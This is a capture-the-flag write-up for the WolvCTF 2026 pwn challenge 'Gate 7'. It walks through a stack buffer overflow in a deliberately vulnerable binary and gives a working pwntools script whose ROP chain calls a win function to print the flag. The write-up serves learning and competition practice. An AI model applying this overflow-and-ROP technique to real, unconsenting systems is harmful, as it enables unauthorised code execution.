---
title: Gate 7
challenge_type: Pwn
difficulty: Easy
author: .ayushmk
writeup_author: "@xabito"
competition: wolvctf-2026
summary: |-
  Garage Gate 7 is stuck and the attendant left for the night. The keypad reads whatever you punch in, but nobody ever told it how long the code is supposed to be. Convince the gate to open itself.
connections:
  - url: gate7.wolvctf-2026.kctf.cloud:1337
attachments:
  - title: dis.tar.gz
    url: /assets/files/wolvctf-2026/gate-7/dis.tar.gz
---

## Recon

We unpacked `dis.tar.gz` to get `gate7`, a dynamically linked, not-stripped ELF
with no canary and no PIE.

```bash
$ checksec --file=gate7
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

NX means no-execute, so we can't run shellcode on the stack. Return-oriented
programming (ROP) instead chains together existing code gadgets using
overwritten return addresses. In the amd64 calling convention, `rdi` holds the
first integer argument, which is why `pop rdi; ret; <value>` sets up
`open_gate`'s argument. No PIE makes the gadget and function addresses reusable.
The symbol table exposes `gadget`, `open_gate`, and the vulnerable `main`.

## Exploitation

`main` contains the overflow:

```console
$ objdump -d gate7
main (0x4012d6):
  401306:  lea  rax, [rbp - 0x30]      ; 48-byte stack buffer
  40130a:  mov  edx, 0x80              ; ...but read 128 bytes
  401317:  call read_full
```

The buffer is at `rbp-0x30` (48 bytes), so the return address sits at offset
**56** (48 + 8 saved `rbp`). The gadget and win function are shown below:

```asm
gadget (0x401202):
  401206:  pop  rdi
  401207:  ret

open_gate (0x40120b):
  40121d:  cmp  qword ptr [rbp - 0x98], 0xc0ffee   ; argument check
  401228:  jne  4012c9                            ; -> "Access denied."
  401233:  mov  edi, 0x402008                     ; "/flag"
  40123d:  call open@plt
   ...
  4012a0:  call write@plt                          ; to stdout
```

`open_gate` prints `/flag` only when its argument is `0xc0ffee`. The chain is
`pop rdi; ret`, followed by `0xc0ffee` and `open_gate`.

`read_full` loops until all 128 requested bytes arrive. Sending only the 80-byte
chain leaves it blocked in another `read`, so pad the payload to exactly 128
bytes; the trailing filler does not affect the chain.

## Flag capture

After padding the chain to 128 bytes, we ran this script against the remote
service:

```python
from pwn import *

context.arch = 'amd64'

POP_RDI   = 0x401206
OPEN_GATE = 0x40120b
MAGIC     = 0xc0ffee
OFFSET    = 56

payload  = b'A' * OFFSET + p64(POP_RDI) + p64(MAGIC) + p64(OPEN_GATE)
payload += b'B' * (0x80 - len(payload))   # satisfy read_full's loop

io = remote('gate7.wolvctf-2026.kctf.cloud', 1337)
io.recvuntil(b'Enter access code:')
io.send(payload)
print(io.recvall(timeout=10).decode(errors='replace'))
```

```bash
$ python exploit.py
[+] Opening connection to gate7.wolvctf-2026.kctf.cloud:1337: Done
wctf{p0p_rd1_ret_th3_gate_1s_0p3n}
```
